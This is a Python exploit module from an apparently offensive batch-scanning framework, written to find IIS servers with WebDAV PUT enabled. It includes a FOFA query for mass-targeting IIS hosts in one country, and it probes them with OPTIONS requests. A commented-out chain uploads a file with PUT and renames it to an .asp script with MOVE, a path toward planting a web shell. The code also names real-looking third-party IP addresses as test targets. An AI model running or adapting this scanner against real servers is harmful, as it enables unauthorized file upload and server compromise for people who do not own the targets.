# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30
import socket

from async_timeout import timeout
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


# fofa: app="IIS-7.0"
# python batch.py -m exploit.web.Unauth.Webdav.Unauth -cs -fs "app=\"IIS\" && country=\"CN\""

class Script(BaseScript):
    name = 'IIS PUT'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UNAUTH and BugType.UPLOADFILE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = 'https://github.com/kolleeee/kollee/blob/e9f274e26ac924a47cf3216e707dc1a724937775/EXPscan/%E4%BA%BA%E5%AE%B6%E5%86%99%E7%9A%84/IIS_webdav.py'
        # 特定路径判断
        self.detectPathList = [80, 443]
        # exec
        self.execPathList = ['/execPath']
        # session
        self.session = session
        # 相关信息
        self.info = ''

    def sendAll(self, IP, port, message):
        try:
            S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            S.connect((IP, port))
            # message="MOVE/123.txt HTTP/1.1\r\nHOST:192.168.1.111\r\nDestination:http://192.168.1.111/123.asp\r\n\r\n"
            S.sendall(message)
            return S.recv(1024)
        except:
            return None

    async def detect(self):
        try:
            with timeout(5):
                for detectPath in self.detectPathList:
                    reader, writer = await asyncio.open_connection(self.target, int(detectPath))
                    data = "OPTIONS / HTTP/1.1\nHost:%s\r\n\r\n" % self.target  # OPTIONS返回服务器的各种信息
                    writer.write(data.encode())
                    await writer.drain()
                    result = str(await reader.read(1024))
                    writer.close()
                    if 'PUT' in result and 'Microsoft-IIS/' in result:  # 查看是否有PUT MOVE  和是否是Microsoft-IIS
                        self.flag = True
                        tqdm.write(Fore.RED + '[{}] {}'.format('IIS OPTIONS PUT METHOD', self.target))
                        return {'name': 'IIS OPTIONS PUT METHOD', 'url': self.target, 'software': 'IIS WEBDAV'}
        except Exception:
            return None
        finally:
            try:
                writer.close()
            except NameError:
                pass

    async def exec(self):
        try:
            pass
            # PUT_txt = "/chacha.txt"
            # # MOVE_asp="/shell.asp"
            # # ip=socket.gethostbyname(url)  #将玉米转换成IP
            # data = "OPTIONS / HTTP/1.1\nHost:%s\r\n\r\n" % self.target  # OPTIONS返回服务器的各种信息
            # OPTIONS = self.sendAll(self.target, 80, data)
            # # print OPTIONS
            # if 'PUT' in OPTIONS and 'Microsoft-IIS/' in OPTIONS:  # 查看是否有PUT MOVE  和是否是Microsoft-IIS
            #     # print "IIS_webdav--Host:%s open  Microsoft-IIS"%(url)
            #     data = "PUT %s HTTP/1.1\nHost:%s\nContent-Length:%s\r\n\r\n%s\r\n\r\n" % (PUT_txt, self.target, len(data) + 1, b'chacha')
            #     PUT = self.sendAll(self.target, 80, data)
            #     if "http://" + self.target + PUT_txt in PUT:
            #         MOVE_asp = "/"
            #         MOVE_asp += 'asdasdasdasd'
            #         MOVE_asp += ".asp"
            #         data = "MOVE %s HTTP/1.1\nHost:%s\nDestination:%s\r\n\r\n" % (PUT_txt, self.target, "http://" + self.target + MOVE_asp)
            #         MOVE = self.sendAll(self.target, 80, data)
            #         if "http://" + self.target + MOVE_asp in MOVE:
            #             print("IIS_webdav--Host:%s open  MOVE" % ("http://" + self.target + MOVE_asp))
            #             if self.http_get(self.target, MOVE_asp):  # 验证地址是否存在
            #                 da = "IIS_webdav--IIS_MOVE  OK  http://" + self.target + MOVE_asp
            #                 print(da)
            #                 # 可以以数组的形式添加到消息队列  在存库
            #                 # ["wwww.xxx.com","IIS_webdav","http://XXXX","备注"]
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
